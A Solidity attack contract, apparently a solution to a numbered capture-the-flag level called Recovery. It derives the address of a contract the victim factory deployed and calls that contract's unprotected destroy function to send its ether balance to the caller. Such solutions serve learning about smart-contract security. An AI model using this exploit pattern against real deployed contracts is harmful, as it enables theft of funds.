// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/17-IRecovery.sol";

contract RecoveryAttack {
    IRecovery public immutable victimRecovery;

    constructor(IRecovery victimRecovery_) {
        victimRecovery = victimRecovery_;
    }

    function attack() external {
        address lostContractAddress = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd6),
                            bytes1(0x94),
                            victimRecovery,
                            bytes1(0x01)
                        )
                    )
                )
            )
        );

        require(0 < lostContractAddress.balance, "Recovery: Wrong balance");

        // solhint-disable-next-line avoid-low-level-calls
        (bool isSuccess, ) = lostContractAddress.call(
            abi.encodeWithSignature("destroy(address)", msg.sender)
        );

        require(
            isSuccess && 0 == lostContractAddress.balance,
            "Recovery: Attack failed"
        );
    }
}